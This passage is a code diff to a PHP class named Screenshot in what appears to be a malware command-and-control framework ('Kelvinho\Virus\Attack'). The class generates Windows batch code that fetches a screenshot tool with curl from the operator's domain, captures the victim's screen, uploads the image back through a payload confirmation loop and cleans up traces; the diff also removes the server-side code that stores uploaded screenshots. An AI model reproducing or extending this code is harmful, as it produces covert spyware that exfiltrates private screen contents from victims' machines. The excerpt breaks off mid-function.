@@ -1,41 +1,15 @@
-<?php /** @noinspection PhpUnused */
+<?php
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
-class Screenshot extends AttackInterface {
+class Screenshot extends AttackBase {
 
-    /**
-     * This will generate the intercept code that will be used to take the reported data back from the virus.
-     */
-    //@formatter:off
-    public function generateIntercept(): string {
-        ob_start(); ?>
-        if (isset($_FILES["screenshot"])) {
-            $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
-            exec("mv \"" . $_FILES["screenshot"]["tmp_name"] . "\" " . DATA_FILE . "/attacks/" . $attack->getAttackId() . "/screen.png");
-            $attack->setExecuted();
-            $attack->saveState();
-        }
-        <?php return ob_get_clean();
-    }
-    //@formatter:on
-
-    /**
-     * This will restore the state of an attack with all of its configuration using a json string.
-     *
-     * @param string $json The JSON string
-     */
     protected function setState(string $json): void {
     }
 
-    /**
-     * This will get the state of an attack as a json string.
-     *
-     * @return string The JSON string
-     */
     protected function getState(): string {
         return json_encode([]);
     }
@@ -46,14 +20,8 @@ class Screenshot extends AttackInterface {
         <?php return ob_get_clean();
     }
 
-    /**
-     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
-     *
-     * @return string
-     */
-    //@formatter:off
     public function generateBatchCode(): string {
-        ob_start(); ?>
+        ob_start(); //@formatter:off ?>
         @echo off
         if not exist "%~pd0..\..\utils\scst.exe" (
             >"%~pd0install.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/install\n"; ?>
@@ -63,15 +31,11 @@ class Screenshot extends AttackInterface {
         "%~pd0..\..\utils\scst.exe" "%~pd0screen.png"
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); ?>
         <?php echo BaseScriptWin::cleanUpPayload(); ?>
-        <?php return ob_get_clean();
+        <?php return ob_get_clean(); //@formatter:on
     }
-    //@formatter:on
 
-    /**
-     * @inheritDoc
-     */
-    public function processExtras(string $resource): void {
-        switch ($resource) {
+    public function processExtras(string $resourceIdentifier): void {
+        switch ($resourceIdentifier) {
             case "install": //@formatter:off ?>
 @echo off
 SetLocal
